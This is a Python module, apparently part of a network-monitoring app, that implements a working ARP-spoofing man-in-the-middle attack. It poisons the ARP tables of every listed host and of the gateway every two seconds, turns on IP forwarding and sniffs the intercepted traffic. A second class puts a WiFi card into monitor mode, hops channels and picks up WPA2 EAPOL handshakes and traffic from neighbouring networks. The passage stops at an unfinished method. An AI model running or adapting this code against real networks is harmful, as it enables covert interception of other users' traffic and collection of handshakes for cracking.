"""
interceptor.py — Intercepción activa de tráfico de red.

Módulo 1: ArpSpoofer
  - Envenena ARP de todos los hosts hacia el router (y viceversa)
  - Activa IP forwarding para no cortar conectividad
  - Los paquetes de TODOS los hosts pasan por esta máquina
  - Scapy los captura y dispara el mismo callback que capture.py

Módulo 2: MonitorCapture  
  - Pone la tarjeta WiFi en modo monitor via airmon-ng
  - Captura frames 802.11 (metadatos: MAC origen/destino, protocolo, tamaño)
  - No descifra contenido cifrado — solo metadatos de quién habla con quién

Arquitectura multihilo:
  - Hilo spoof_loop   : reenvía paquetes ARP envenenados cada 2s (mantiene el engaño)
  - Hilo restore_loop : vigilancia — si se detiene, restaura ARP limpio
  - Hilo sniff_mitm   : scapy sniff sobre la interfaz, captura paquetes reenviados
  - Hilo monitor_sniff: scapy sniff en modo monitor (solo MonitorCapture)

Uso desde app.py:
  interceptor = Interceptor(callback=self._on_paquete_capturado)
  interceptor.iniciar(interfaz, gateway_ip, gateway_mac, hosts)
  # hosts = [(ip, mac), ...]
  interceptor.detener()
"""

import threading
import time
import subprocess
import queue
from datetime import datetime


# Log interno — puede ser reemplazado por set_log_callback()
_log_fn = None

def log(msg):
    if _log_fn is None:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
    if _log_fn is not None:
        try:
            _log_fn(msg)
        except Exception:
            pass

def set_log_callback(fn):
    """Conecta el log del interceptor al buffer central de app.py."""
    global _log_fn
    _log_fn = fn


# ─────────────────────────────────────────────────────────────────
# INTERCEPTOR — Orquestador principal
# ─────────────────────────────────────────────────────────────────

class Interceptor:
    """
    Orquesta ARP spoofing + captura MITM + modo monitor WiFi.

    Con 1 tarjeta: ARP spoof activo, captura virtual (macvlan/promiscuo)
    Con 2 tarjetas: ARP spoof en tarjeta principal + monitor 802.11 real
                    en segunda tarjeta → filtrado por BSSID de nuestra red
    """

    def __init__(self, callback, callback_wifi=None):
        """
        callback      : recibe paquetes de nuestra red (igual que capture.py)
        callback_wifi : recibe eventos del entorno WiFi (APs vecinos, handshakes)
                        Si es None, los eventos WiFi solo se loguean
        """
        self.callback       = callback
        self.callback_wifi  = callback_wifi
        self.corriendo      = False
        self._stop_evt      = threading.Event()
        self._lock          = threading.Lock()

        self._spoofer       = None
        self._monitor       = None

        self._cola_paquetes = queue.Queue(maxsize=2000)
        self._hilo_despacho = None

        # Info de la segunda tarjeta para restauración al salir
        self._iface_monitor    = None
        self._estado_orig_mon  = None   # "managed" o estado previo

    # ── ARRANQUE / PARADA ────────────────────────────────────────

    def iniciar(self, interfaz, gateway_ip, gateway_mac, hosts,
                gateway_bssid=None):
        """
        interfaz      : interfaz principal con ARP spoof (ej: wlan0)
        gateway_ip    : IP del router
        gateway_mac   : MAC del router
        hosts         : lista de (ip, mac) a interceptar
        gateway_bssid : BSSID del AP de nuestra red para filtrar en monitor
                        (generalmente == gateway_mac)
        """
        if self.corriendo:
            log("[INTERCEPTOR] Ya está corriendo")
            return
        if not hosts:
            log("[INTERCEPTOR] Sin hosts para interceptar")
            return

        self._stop_evt.clear()
        self.corriendo = True

        bssid = gateway_bssid or gateway_mac
        log(f"[INTERCEPTOR] Iniciando | iface: {interfaz} | "
            f"gateway: {gateway_ip} | {len(hosts)} hosts | BSSID: {bssid}")

        # ── Despachador ───────────────────────────────────────────
        self._hilo_despacho = threading.Thread(
            target=self._loop_despacho,
            daemon=True, name="interceptor-despacho")
        self._hilo_despacho.start()

        # ── ARP Spoofer en interfaz principal ─────────────────────
        self._spoofer = ArpSpoofer(
            interfaz=interfaz,
            gateway_ip=gateway_ip,
            gateway_mac=gateway_mac,
            hosts=list(hosts),
            cola_paquetes=self._cola_paquetes,
            stop_evt=self._stop_evt
        )
        self._spoofer.iniciar()

        # ── Detección de segunda tarjeta física ───────────────────
        iface_mon = self._detectar_segunda_wifi_fisica(interfaz)
        if iface_mon:
            log(f"[INTERCEPTOR] Segunda tarjeta física: {iface_mon} "
                f"→ activando modo monitor 802.11")
            self._iface_monitor = iface_mon
            self._monitor = MonitorCapture(
                interfaz=iface_mon,
                bssid_objetivo=bssid,
                cola_red=self._cola_paquetes,      # tráfico de nuestra red
                callback_wifi=self.callback_wifi,  # entorno WiFi externo
                stop_evt=self._stop_evt
            )
            self._monitor.iniciar()
        else:
            log(f"[INTERCEPTOR] Una tarjeta ({interfaz}) "
                f"— modo monitor no disponible, captura virtual activa")
            self._monitor = MonitorCapture(
                interfaz=interfaz,
                bssid_objetivo=bssid,
                cola_red=self._cola_paquetes,
                callback_wifi=self.callback_wifi,
                stop_evt=self._stop_evt,
                modo_virtual=True          # sin airmon-ng
            )
            self._monitor.iniciar()

    def _detectar_segunda_wifi_fisica(self, interfaz_principal):
        """
        Detecta una segunda tarjeta WiFi FÍSICA (no virtual).
        Busca interfaces wlan*/wlp* distintas a la principal.
        No requiere que tenga IP — puede estar sin conectar.
        Descarta interfaces virtuales (macvlan, etc.) y docker.
        """
        try:
            resultado = subprocess.run(
                ["ip", "-o", "link", "show"],
                capture_output=True, text=True, timeout=5)
            for linea in resultado.stdout.splitlines():
                partes = linea.split(":")
                if len(partes) < 2:
                    continue
                nombre = partes[1].strip().split("@")[0].strip()
                # Solo WiFi real
                if not (nombre.startswith("wlan") or nombre.startswith("wlp")):
                    continue
                # No la interfaz principal
                if nombre == interfaz_principal:
                    continue
                # No interfaces virtuales (tienen @ en el nombre original)
                if "@" in partes[1]:
                    continue
                # No interfaces _mitm que nosotros creamos
                if "_mitm" in nombre:
                    continue
                # Verificar que sea una tarjeta física via sysfs
                path_phy = f"/sys/class/net/{nombre}/phy80211"
                try:
                    import os
                    if os.path.exists(path_phy):
                        log(f"[INTERCEPTOR] Tarjeta física detectada: {nombre}")
                        return nombre
                except Exception:
                    # Si no podemos verificar por sysfs, confiar en el nombre
                    return nombre
        except Exception as e:
            log(f"[INTERCEPTOR] Error detectando segunda WiFi: {e}")
        return None

    def detener(self):
        if not self.corriendo:
            return
        log("[INTERCEPTOR] Deteniendo...")
        self._stop_evt.set()
        self.corriendo = False

        if self._spoofer:
            self._spoofer.detener()
            self._spoofer = None

        if self._monitor:
            self._monitor.detener()
            self._monitor = None

        log("[INTERCEPTOR] Detenido — red restaurada")

    def agregar_host(self, ip, mac):
        """Agrega un host nuevo al pool de spoofing en caliente."""
        if self._spoofer and self.corriendo:
            self._spoofer.agregar_host(ip, mac)

    # ── DESPACHO AL CALLBACK ─────────────────────────────────────

    def _loop_despacho(self):
        """
        Consume la cola de paquetes y llama al callback de app.py.
        Corre en su propio hilo para no bloquear captura.
        """
        while not self._stop_evt.is_set():
            try:
                datos = self._cola_paquetes.get(timeout=1)
                if datos and self.callback:
                    try:
                        self.callback(datos)
                    except Exception as e:
                        log(f"[INTERCEPTOR] Error en callback: {e}")
            except queue.Empty:
                continue
            except Exception as e:
                log(f"[INTERCEPTOR] Error en despacho: {e}")
        log("[INTERCEPTOR] Hilo despacho terminado")


# ─────────────────────────────────────────────────────────────────
# ARP SPOOFER
# ─────────────────────────────────────────────────────────────────

class ArpSpoofer:
    """
    Envenena las tablas ARP de todos los hosts y del gateway.
    
    Técnica:
      - Le dice a cada HOST: "el gateway soy yo" (mi MAC)  
      - Le dice al GATEWAY: "el host X soy yo" (mi MAC)
      - IP forwarding = 1 para que los paquetes sigan fluyendo
      - Scapy sniff en promiscuo captura todo el tráfico que pasa
    
    Hilos:
      - spoof_loop  : cada 2s reenvía los paquetes ARP falsos
      - sniff_mitm  : captura continua del tráfico interceptado
    """

    INTERVALO_SPOOF = 2   # segundos entre reenvíos ARP

    def __init__(self, interfaz, gateway_ip, gateway_mac,
                 hosts, cola_paquetes, stop_evt):
        self._interfaz    = interfaz
        self._gw_ip       = gateway_ip
        self._gw_mac      = gateway_mac
        self._hosts       = list(hosts)   # [(ip, mac), ...]
        self._cola        = cola_paquetes
        self._stop_evt    = stop_evt
        self._lock        = threading.Lock()
        self._mi_mac      = None          # se obtiene al iniciar
        self._mi_ip       = None          # se obtiene al iniciar
        self._ip_fwd_orig = "0"           # valor original de ip_forward

    def iniciar(self):
        self._mi_mac = self._obtener_mi_mac()
        if not self._mi_mac:
            log("[SPOOFER] No se pudo obtener MAC propia — abortando")
            return
        self._mi_ip = self._obtener_mi_ip()
        self._registrar_atexit()  # Seguro: restaura ARP aunque crashee

        self._activar_ip_forward()

        # Hilo de envenenamiento continuo
        threading.Thread(
            target=self._loop_spoof,
            daemon=True, name="spoofer-loop").start()

        # Hilo de captura MITM
        threading.Thread(
            target=self._loop_sniff,
            daemon=True, name="spoofer-sniff").start()

        log(f"[SPOOFER] Activo | Mi MAC: {self._mi_mac} | "
            f"Gateway: {self._gw_ip} | Hosts: {len(self._hosts)}")

    def detener(self):
        # Restaurar ARP legítimo antes de salir
        self._restaurar_arp()
        self._desactivar_ip_forward()
        log("[SPOOFER] ARP restaurado — tráfico normal")

    def agregar_host(self, ip, mac):
        with self._lock:
            if not any(h[0] == ip for h in self._hosts):
                self._hosts.append((ip, mac))
                log(f"[SPOOFER] Host agregado al pool: {ip}")

    # ── LOOP DE ENVENENAMIENTO ────────────────────────────────────

    def _loop_spoof(self):
        """Reenvía paquetes ARP falsos cada INTERVALO_SPOOF segundos."""
        try:
            from scapy.all import ARP, Ether, sendp
            import warnings
            warnings.filterwarnings("ignore", category=UserWarning,
                                    module="scapy")
        except ImportError:
            log("[SPOOFER] scapy no disponible")
            return

        while not self._stop_evt.is_set():
            try:
                with self._lock:
                    hosts_actuales = list(self._hosts)

                for ip_host, mac_host in hosts_actuales:
                    if self._stop_evt.is_set():
                        break
                    try:
                        # Usar sendp() capa 2 con MAC destino explícita
                        # → elimina el warning "should be providing Ethernet MAC"
                        pkt_host = Ether(dst=mac_host) / ARP(
                            op=2,
                            pdst=ip_host,
                            hwdst=mac_host,
                            psrc=self._gw_ip,
                            hwsrc=self._mi_mac
                        )
                        sendp(pkt_host, verbose=False,
                              iface=self._interfaz)

                        pkt_gw = Ether(dst=self._gw_mac) / ARP(
                            op=2,
                            pdst=self._gw_ip,
                            hwdst=self._gw_mac,
                            psrc=ip_host,
                            hwsrc=self._mi_mac
                        )
                        sendp(pkt_gw, verbose=False,
                              iface=self._interfaz)

                    except Exception as e:
                        log(f"[SPOOFER] Error enviando ARP a {ip_host}: {e}")

                time.sleep(self.INTERVALO_SPOOF)

            except Exception as e:
                log(f"[SPOOFER] Error en loop_spoof: {e}")
                time.sleep(2)

        log("[SPOOFER] Loop spoof terminado")

    # ── SNIFF MITM ────────────────────────────────────────────────

    def _loop_sniff(self):
        """
        Captura tráfico MITM. Maneja reconexión automática cuando
        el carrier WiFi cae momentáneamente (Errno 100 = Network is down).
        Los warnings de scapy sobre sockets L2 se suprimen — son normales
        en WiFi bajo carga y no indican un error real.
        """
        try:
            from scapy.all import sniff
            import warnings
            # Suprimir warnings de scapy sobre sockets L2 — son ruido normal
            warnings.filterwarnings("ignore", category=UserWarning,
                                    module="scapy")
        except ImportError:
            log("[SPOOFER] scapy no disponible para sniff MITM")
            return

        log("[SPOOFER] Sniff MITM iniciado")
        while not self._stop_evt.is_set():
            try:
                sniff(
                    iface=self._interfaz,
                    prn=self._procesar_paquete_mitm,
                    store=False,
                    timeout=2,
                    filter="ip"
                )
            except OSError as e:
                errno_val = getattr(e, 'errno', None)
                if errno_val == 100:
                    # Network is down — carrier WiFi caído momentáneamente
                    # Es normal bajo carga. Esperar y reconectar silenciosamente.
                    time.sleep(1)
                    continue
                if not self._stop_evt.is_set():
                    log(f"[SPOOFER] OSError sniff ({errno_val}): {e}")
                time.sleep(1)
            except Exception as e:
                if not self._stop_evt.is_set():
                    log(f"[SPOOFER] Error sniff MITM: {e}")
                time.sleep(1)

        log("[SPOOFER] Sniff MITM terminado")

    def _procesar_paquete_mitm(self, paquete):
        """
        Procesa paquetes capturados en modo MITM con filtros inteligentes.

        Filtro 1 — MAC propia: si mac_src == mi_mac → paquete nuestro,
                   capture.py ya lo maneja, ignorar para evitar duplicados.
        Filtro 2 — Respuestas nmap: si ip_dst == mi_ip → son respuestas
                   a nuestros propios escaneos, no tráfico real entre hosts.
        Filtro 3 — MACs conocidas: solo procesar MACs de hosts de la red
                   (lista de interceptados + gateway). Descarta tráfico
                   externo que no nos interesa.
        """
        try:
            from scapy.all import IP, IPv6, TCP, UDP, ICMP, ARP, Ether, DNS
            try:
                from scapy.all import IGMP
            except ImportError:
                IGMP = None
            try:
                from scapy.layers.ipsec import ESP, AH
            except ImportError:
                ESP = None; AH = None
            try:
                from scapy.contrib.sctp import SCTP
            except ImportError:
                SCTP = None

            if not paquete.haslayer(IP):
                return

            ip_layer = paquete[IP]
            ip_src   = ip_layer.src
            ip_dst   = ip_layer.dst

            mac_src = paquete[Ether].src if paquete.haslayer(Ether) else None

            # ── Filtro 1: Descartar paquetes propios ──────────────
            if mac_src and self._mi_mac and mac_src.lower() == self._mi_mac.lower():
                return

            # ── Filtro 2: Descartar respuestas a nmap/escaneos propios ──
            # Paquetes destinados a nuestra IP son respuestas a lo que
            # nosotros enviamos — capture.py los registra, aquí los ignoramos
            if self._mi_ip and ip_dst == self._mi_ip:
                return

            # ── Filtro 3: Solo MACs conocidas de la red ───────────
            with self._lock:
                macs_conocidas = {m.lower() for _, m in self._hosts if m}
            if self._gw_mac:
                macs_conocidas.add(self._gw_mac.lower())

            if mac_src and mac_src.lower() not in macs_conocidas:
                return  # MAC desconocida — ignorar

            # ── Paquete válido: registrar ─────────────────────────
            protocolo, puerto = self._resolver_protocolo_ip(
                paquete, ip_layer,
                TCP, UDP, ICMP, IGMP, ESP, AH, SCTP, DNS)

            datos = {
                "tipo"           : protocolo,
                "ip_origen"      : ip_src,
                "ip_destino"     : ip_dst,
                "mac_origen"     : mac_src,
                "ttl"            : ip_layer.ttl,
                "puerto_destino" : puerto,
                "bytes"          : len(paquete),
                "interceptado"   : True
            }

            try:
                self._cola.put_nowait(datos)
            except queue.Full:
                pass

        except Exception:
            pass

    def _resolver_protocolo_ip(self, paquete, ip,
                                TCP, UDP, ICMP, IGMP, ESP, AH, SCTP, DNS):
        """Mismo resolvedor que capture.py — detecta capa 4 y capa 7."""
        if paquete.haslayer(TCP):
            dport = paquete[TCP].dport
            sport = paquete[TCP].sport
            return self._resolver_app_proto(dport, "TCP", sport), dport
        elif paquete.haslayer(UDP):
            dport = paquete[UDP].dport
            sport = paquete[UDP].sport
            return self._resolver_app_proto(dport, "UDP", sport), dport
        elif SCTP and paquete.haslayer(SCTP):
            return "SCTP", paquete[SCTP].dport
        elif paquete.haslayer(ICMP):
            tipo_icmp = paquete[ICMP].type
            nombres   = {0:"ICMP-Reply", 3:"ICMP-Unreach",
                         8:"ICMP-Echo",  11:"ICMP-TTL",
                         5:"ICMP-Redirect"}
            return nombres.get(tipo_icmp, "ICMP"), 0
        elif IGMP and paquete.haslayer(IGMP):
            return "IGMP", 0
        elif ESP and paquete.haslayer(ESP):
            return "IPSec-ESP", 0
        elif AH and paquete.haslayer(AH):
            return "IPSec-AH", 0
        else:
            proto_num = ip.proto
            nombres_proto = {
                1:"ICMP", 2:"IGMP", 4:"IP-in-IP",
                6:"TCP",  17:"UDP", 41:"IPv6-in-IP",
                50:"IPSec-ESP", 51:"IPSec-AH",
                58:"ICMPv6", 89:"OSPF", 132:"SCTP"
            }
            return nombres_proto.get(proto_num, f"IP-{proto_num}"), 0

    def _resolver_app_proto(self, dport, base, sport=0):
        """Infiere protocolo de capa 7 por número de puerto."""
        if base == "UDP" and dport in (443, 80):
            return "QUIC"
        APP_PROTOS = {
            20:"FTP-Data", 21:"FTP",    22:"SSH",       23:"Telnet",
            25:"SMTP",     53:"DNS",    67:"DHCP",       68:"DHCP",
            69:"TFTP",     80:"HTTP",   110:"POP3",      123:"NTP",
            143:"IMAP",    161:"SNMP",  162:"SNMP-Trap", 179:"BGP",
            389:"LDAP",    443:"HTTPS", 445:"SMB",       465:"SMTPS",
            500:"IKE",     514:"Syslog",554:"RTSP",      587:"SMTP-Sub",
            636:"LDAPS",   993:"IMAPS", 995:"POP3S",     1194:"OpenVPN",
            1433:"MSSQL",  1723:"PPTP", 1883:"MQTT",     3306:"MySQL",
            3389:"RDP",    5060:"SIP",  5222:"XMPP",     5432:"PostgreSQL",
            5900:"VNC",    6379:"Redis",8080:"HTTP-Alt",  8443:"HTTPS-Alt",
            8000:"Hikvision", 9010:"Hikvision-SDR",
        }
        nombre = APP_PROTOS.get(dport) or APP_PROTOS.get(sport)
        return nombre if nombre else base

    # ── RESTAURAR ARP ────────────────────────────────────────────

    def _restaurar_arp(self):
        """Envía paquetes ARP legítimos con sendp (capa 2) para limpiar tablas envenenadas."""
        try:
            from scapy.all import ARP, Ether, sendp
            with self._lock:
                hosts_actuales = list(self._hosts)

            log(f"[SPOOFER] Restaurando ARP para {len(hosts_actuales)} hosts...")
            for ip_host, mac_host in hosts_actuales:
                try:
                    pkt_host = Ether(dst=mac_host) / ARP(
                        op=2,
                        pdst=ip_host,
                        hwdst=mac_host,
                        psrc=self._gw_ip,
                        hwsrc=self._gw_mac
                    )
                    pkt_gw = Ether(dst=self._gw_mac) / ARP(
                        op=2,
                        pdst=self._gw_ip,
                        hwdst=self._gw_mac,
                        psrc=ip_host,
                        hwsrc=mac_host
                    )
                    sendp(pkt_host, count=3, verbose=False,
                          iface=self._interfaz)
                    sendp(pkt_gw,   count=3, verbose=False,
                          iface=self._interfaz)
                except Exception as e:
                    log(f"[SPOOFER] Error restaurando {ip_host}: {e}")
        except Exception as e:
            log(f"[SPOOFER] Error en restaurar_arp: {e}")

    # ── IP FORWARDING ────────────────────────────────────────────

    def _activar_ip_forward(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                self._ip_fwd_orig = f.read().strip()
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            log("[SPOOFER] IP forwarding activado")
        except Exception as e:
            log(f"[SPOOFER] No se pudo activar IP forwarding: {e}")

    def _desactivar_ip_forward(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self._ip_fwd_orig)
            log(f"[SPOOFER] IP forwarding restaurado a {self._ip_fwd_orig}")
        except Exception as e:
            log(f"[SPOOFER] Error restaurando IP forwarding: {e}")

    # ── HELPERS ──────────────────────────────────────────────────

    def _obtener_mi_mac(self):
        try:
            from scapy.all import get_if_hwaddr
            mac = get_if_hwaddr(self._interfaz)
            return mac
        except Exception:
            pass
        try:
            resultado = subprocess.run(
                ["cat", f"/sys/class/net/{self._interfaz}/address"],
                capture_output=True, text=True, timeout=3)
            return resultado.stdout.strip()
        except Exception as e:
            log(f"[SPOOFER] Error obteniendo MAC propia: {e}")
            return None

    def _obtener_mi_ip(self):
        """Obtiene la IP de esta máquina en la interfaz usada."""
        try:
            resultado = subprocess.run(
                ["ip", "-4", "addr", "show", self._interfaz],
                capture_output=True, text=True, timeout=3)
            import re
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', resultado.stdout)
            if m:
                return m.group(1)
        except Exception:
            pass
        return None

    def _registrar_atexit(self):
        """
        Registra restauración de ARP como handler de salida del proceso.
        Garantía de seguridad: aunque el programa crashee sin pasar
        por _salir(), el ARP se restaura antes de que el proceso muera.
        """
        import atexit
        atexit.register(self._restaurar_arp_silencioso)

    def _restaurar_arp_silencioso(self):
        """Restauración silenciosa para atexit — sin logs que puedan fallar."""
        try:
            from scapy.all import ARP, send
            with self._lock:
                hosts = list(self._hosts)
            for ip_host, mac_host in hosts:
                try:
                    send(ARP(op=2, pdst=ip_host, hwdst=mac_host,
                             psrc=self._gw_ip, hwsrc=self._gw_mac),
                         count=3, verbose=False, iface=self._interfaz)
                    send(ARP(op=2, pdst=self._gw_ip, hwdst=self._gw_mac,
                             psrc=ip_host, hwsrc=mac_host),
                         count=3, verbose=False, iface=self._interfaz)
                except Exception:
                    pass
            # Restaurar ip_forward al valor original
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write(self._ip_fwd_orig)
        except Exception:
            pass



# ─────────────────────────────────────────────────────────────────
# MONITOR CAPTURE — Modo monitor real (2 tarjetas) o virtual (1)
# ─────────────────────────────────────────────────────────────────

class MonitorCapture:
    """
    Captura WiFi inteligente con dos modos:

    MODO REAL (2 tarjetas físicas):
      - Activa modo monitor 802.11 en la segunda tarjeta (wlan1)
      - wlan0 sigue en managed con ARP spoof activo — sin interrupciones
      - Filtra frames por BSSID de nuestra red → alimenta la topología
      - Todo lo demás (APs vecinos, clientes externos) → callback_wifi
      - Al salir: restaura wlan1 a modo managed

    MODO VIRTUAL (1 tarjeta):
      - Intenta macvlan sobre wlan0 para segundo socket L2
      - Fallback: sniff directo con filtro BPF "not src host <mi_ip>"
      - Solo captura tráfico que pasa por MITM — no ve frames 802.11
    """

    def __init__(self, interfaz, bssid_objetivo, cola_red,
                 callback_wifi, stop_evt, modo_virtual=False):
        """
        interfaz       : wlan1 (modo real) o wlan0 (modo virtual)
        bssid_objetivo : MAC del AP de nuestra red para filtrar
        cola_red       : Queue donde van paquetes de nuestra red
        callback_wifi  : función(evento_dict) para entorno WiFi externo
        stop_evt       : threading.Event para parar
        modo_virtual   : True = no usar airmon-ng, usar macvlan/promiscuo
        """
        self._interfaz       = interfaz
        self._bssid          = bssid_objetivo.lower() if bssid_objetivo else None
        self._cola_red       = cola_red
        self._callback_wifi  = callback_wifi
        self._stop_evt       = stop_evt
        self._modo_virtual   = modo_virtual
        self._interfaz_mon   = None    # nombre real en modo monitor
        self._interfaz_virt  = None    # macvlan si se crea
        self._mi_ip          = None
        self._estado_orig    = "managed"  # para restauración

    def iniciar(self):
        if self._modo_virtual:
            self._iniciar_virtual()
        else:
            self._iniciar_monitor_real()

    def detener(self):
        if not self._modo_virtual and self._interfaz_mon:
            self._restaurar_managed()
        if self._interfaz_virt:
            self._eliminar_macvlan(self._interfaz_virt)
        log(f"[MONITOR] Detenido — {self._interfaz} restaurada")

    # ── MODO REAL: 802.11 monitor en segunda tarjeta ──────────────

    def _iniciar_monitor_real(self):
        """Activa modo monitor 802.11 en wlan1 sin tocar wlan0."""
        self._estado_orig = self._obtener_estado_actual(self._interfaz)
        iface_mon = self._activar_monitor_802_11(self._interfaz)
        if not iface_mon:
            log(f"[MONITOR] No se pudo activar monitor en {self._interfaz} "
                f"— usando captura promiscua")
            self._iniciar_virtual()
            return

        self._interfaz_mon = iface_mon

        # Hilo de captura 802.11
        threading.Thread(
            target=self._loop_monitor_80211,
            args=(iface_mon,),
            daemon=True, name="monitor-80211").start()

        # Hilo de channel hopping — barre todos los canales WiFi
        # Sin esto solo se ven APs en el canal actual
        threading.Thread(
            target=self._loop_channel_hop,
            args=(iface_mon,),
            daemon=True, name="monitor-chanhop").start()

        log(f"[MONITOR] 802.11 activo en {iface_mon} | "
            f"filtro BSSID: {self._bssid} | channel hopping activo")

    def _activar_monitor_802_11(self, interfaz):
        """
        Activa modo monitor. Prueba airmon-ng primero, luego iw.
        Devuelve nombre de interfaz monitor o None.
        """
        # Método 1: airmon-ng
        try:
            r = subprocess.run(
                ["airmon-ng", "start", interfaz],
                capture_output=True, text=True, timeout=15)
            # Buscar "monitor mode" y nombre de interfaz
            import re
            for linea in r.stdout.splitlines():
                m = re.search(r'(\w+mon\d*)', linea)
                if m and "monitor" in linea.lower():
                    iface_mon = m.group(1)
                    # Verificar que existe
                    r2 = subprocess.run(
                        ["ip", "link", "show", iface_mon],
                        capture_output=True, timeout=3)
                    if r2.returncode == 0:
                        log(f"[MONITOR] airmon-ng → {iface_mon}")
                        return iface_mon
            # Nombre estándar
            iface_mon = interfaz + "mon"
            r2 = subprocess.run(
                ["ip", "link", "show", iface_mon],
                capture_output=True, timeout=3)
            if r2.returncode == 0:
                return iface_mon
        except FileNotFoundError:
            log("[MONITOR] airmon-ng no encontrado")
        except Exception as e:
            log(f"[MONITOR] airmon-ng error: {e}")

        # Método 2: iw directo
        try:
            subprocess.run(["ip",  "link", "set", interfaz, "down"],
                           capture_output=True, timeout=5)
            subprocess.run(["iw",  "dev",  interfaz, "set", "type", "monitor"],
                           capture_output=True, timeout=5)
            subprocess.run(["ip",  "link", "set", interfaz, "up"],
                           capture_output=True, timeout=5)
            log(f"[MONITOR] iw monitor → {interfaz}")
            return interfaz
        except Exception as e:
            log(f"[MONITOR] iw error: {e}")

        return None

    def _restaurar_managed(self):
        """Restaura wlan1 a modo managed — siempre al salir."""
        iface = self._interfaz_mon or self._interfaz
        log(f"[MONITOR] Restaurando {iface} → managed")
        # Paso 1: airmon-ng stop
        try:
            subprocess.run(["airmon-ng", "stop", iface],
                           capture_output=True, timeout=15)
            time.sleep(1)
        except Exception:
            pass
        # Paso 2: forzar iw managed (por si airmon-ng no funcionó)
        for nombre in set([iface, self._interfaz]):
            try:
                r = subprocess.run(
                    ["ip", "link", "show", nombre],
                    capture_output=True, timeout=3)
                if r.returncode != 0:
                    continue
                subprocess.run(["ip",  "link", "set", nombre, "down"],
                               capture_output=True, timeout=5)
                subprocess.run(["iw",  "dev",  nombre, "set", "type", "managed"],
                               capture_output=True, timeout=5)
                subprocess.run(["ip",  "link", "set", nombre, "up"],
                               capture_output=True, timeout=5)
                log(f"[MONITOR] {nombre} → managed OK")
            except Exception as e:
                log(f"[MONITOR] Error restaurando {nombre}: {e}")

    def _obtener_estado_actual(self, interfaz):
        try:
            r = subprocess.run(
                ["iw", "dev", interfaz, "info"],
                capture_output=True, text=True, timeout=5)
            import re
            m = re.search(r'type (\w+)', r.stdout)
            return m.group(1) if m else "managed"
        except Exception:
            return "managed"

    def _loop_channel_hop(self, iface):
        """
        Cambia el canal de la interfaz en modo monitor cada 500ms.
        Esto permite detectar APs en TODOS los canales WiFi (1-14 para 2.4GHz,
        36-177 para 5GHz) en lugar de solo el canal actual.
        Sin channel hopping solo se ven los APs en el canal donde
        quedó fija la tarjeta al activar modo monitor.
        """
        # Canales 2.4 GHz primero (más APs domésticos), luego 5 GHz
        canales_24ghz = list(range(1, 15))
        canales_5ghz  = [36, 40, 44, 48, 52, 56, 60, 64,
                         100,104,108,112,116,120,124,128,
                         132,136,140,149,153,157,161,165]
        todos_canales = canales_24ghz + canales_5ghz

        log(f"[MONITOR] Channel hopping iniciado en {iface} "
            f"({len(todos_canales)} canales)")

        idx = 0
        while not self._stop_evt.is_set():
            canal = todos_canales[idx % len(todos_canales)]
            try:
                subprocess.run(
                    ["iw", "dev", iface, "set", "channel", str(canal)],
                    capture_output=True, timeout=2)
            except Exception:
                pass
            idx += 1
            # 500ms por canal en 2.4GHz, 200ms en 5GHz (menos tráfico)
            dwell = 0.5 if canal <= 14 else 0.2
            self._stop_evt.wait(timeout=dwell)

        log("[MONITOR] Channel hopping terminado")

    # ── LOOP 802.11 ───────────────────────────────────────────────

    def _loop_monitor_80211(self, iface):
        """
        Captura frames 802.11 en modo monitor.

        Clasificación por BSSID:
        - Frame de nuestra red (BSSID == bssid_objetivo) → cola_red
        - Frame de otras redes → callback_wifi (panel Entorno WiFi)
        - Beacons de APs → callback_wifi (descubrimiento de redes)
        - Handshakes EAPOL → hallazgo en nuestra red si es nuestro BSSID
        """
        try:
            from scapy.all import sniff
            import warnings
            warnings.filterwarnings("ignore", category=UserWarning,
                                    module="scapy")
        except ImportError:
            log("[MONITOR] scapy no disponible")
            return

        log(f"[MONITOR] Sniff 802.11 iniciado en {iface}")
        while not self._stop_evt.is_set():
            try:
                sniff(
                    iface=iface,
                    prn=self._procesar_frame_80211,
                    store=False,
                    timeout=2
                )
            except OSError as e:
                errno_val = getattr(e, 'errno', None)
                if errno_val == 100:   # Network is down — transitorio
                    time.sleep(1)
                    continue
                if errno_val == 19:    # No such device — wlan1mon desapareció
                    if not self._stop_evt.is_set():
                        log(f"[MONITOR] Dispositivo perdido — esperando recuperación...")
                    # Backoff: esperar 30s sin spamear
                    for _ in range(30):
                        if self._stop_evt.is_set():
                            break
                        time.sleep(1)
                    continue
                if not self._stop_evt.is_set():
                    log(f"[MONITOR] OSError 802.11: {e}")
                time.sleep(1)
            except Exception as e:
                if not self._stop_evt.is_set():
                    log(f"[MONITOR] Error 802.11: {e}")
                time.sleep(1)
        log("[MONITOR] Sniff 802.11 terminado")

    def _procesar_frame_80211(self, frame):
        """Clasifica frames 802.11 y los enruta al destino correcto."""
        try:
            from scapy.all import Dot11, Dot11Beacon, Dot11ProbeResp
            from scapy.all import Dot11Auth, EAPOL, IP, TCP, UDP, ICMP, Ether

            if not frame.haslayer(Dot11):
                return

            dot11    = frame[Dot11]
            mac_src  = dot11.addr2   # Transmisor
            mac_dst  = dot11.addr1   # Receptor
            bssid_f  = dot11.addr3   # BSSID del AP

            # ── Beacons y Probe Responses: descubrimiento de APs ──
            if frame.haslayer(Dot11Beacon) or frame.haslayer(Dot11ProbeResp):
                self._procesar_beacon(frame, bssid_f, mac_src)
                return

            # ── EAPOL: handshake WPA2 ─────────────────────────────
            if frame.haslayer(EAPOL):
                self._procesar_eapol(frame, bssid_f, mac_src, mac_dst)
                return

            # ── Frames de datos con IP ────────────────────────────
            if not frame.haslayer(IP):
                return

            ip_layer = frame[IP]
            es_nuestra_red = (
                self._bssid and bssid_f and
                bssid_f.lower() == self._bssid
            )

            if es_nuestra_red:
                # Tráfico de nuestra red → topología principal
                self._enrutar_a_red(frame, ip_layer, mac_src)
            else:
                # Tráfico de otras redes → panel WiFi
                if self._callback_wifi:
                    try:
                        self._callback_wifi({
                            "tipo"     : "trafico_externo",
                            "bssid"    : bssid_f,
                            "mac_src"  : mac_src,
                            "ip_src"   : ip_layer.src,
                            "ip_dst"   : ip_layer.dst,
                            "bytes"    : len(frame)
                        })
                    except Exception:
                        pass

        except Exception:
            pass

    def _procesar_beacon(self, frame, bssid, mac_src):
